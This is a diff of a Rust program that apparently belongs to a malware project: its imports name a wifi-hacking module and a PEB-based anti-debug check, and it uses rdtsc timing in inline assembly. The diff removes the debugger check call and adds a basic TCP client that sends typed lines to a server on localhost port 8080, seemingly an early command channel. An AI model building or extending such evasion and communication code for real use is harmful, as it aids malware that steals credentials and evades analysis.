@@ -17,6 +17,18 @@ use maliciousScripts::wifi_hack::wifi_ext;
 use AntiDebugChecks::peb_traversal::check_debug;
 use std::time::{Instant,Duration};
 use std::arch::asm;
+use std::io::{self, Bytes, Read, Write};
+use std::net::{Ipv4Addr,SocketAddrV4};
+use std::net::Shutdown;
+use std::net::{TcpStream,TcpListener};
+
+const ADDR:Ipv4Addr = Ipv4Addr::new(127,0,0,1);
+//This is the constant address made for the socket
+const PORT:u16 = 8080;
+//This is the hex format of the port
+
+
+
 
 #[derive(Debug,Default)]
 struct ULARGE_INTEGER{
@@ -52,7 +64,32 @@ fn main(){
         out("rdx") start_time.HighPart,
         out("rax") start_time.LowPart,
     );
-    unsafe{check_debug();}
+
+    //Work area
+    println!("Hello client");
+
+
+    if let Ok(mut stream) = TcpStream::connect(SocketAddrV4::new(ADDR,PORT)){
+        println!("Connected to the server {:?}",stream.peer_addr().unwrap());
+loop{
+        let mut message = String::new();
+        io::stdin().read_line(&mut message);
+        match message.as_str(){
+            "#END#" => stream.shutdown(Shutdown::Both).expect("Shutdown Failed!!"),
+            _ => {
+                println!("Sent the message..");
+                stream.write(&message.into_bytes());
+                //this is for writing to the stream.
+                //The one that writes will send and the one that reads will always receive.
+            }
+        }
+    }
+    }
+    else{
+        println!("Could not connect to the server!!");
+    }
+
+
     asm!(
         "xor rcx,rcx",
         "rdtsc",
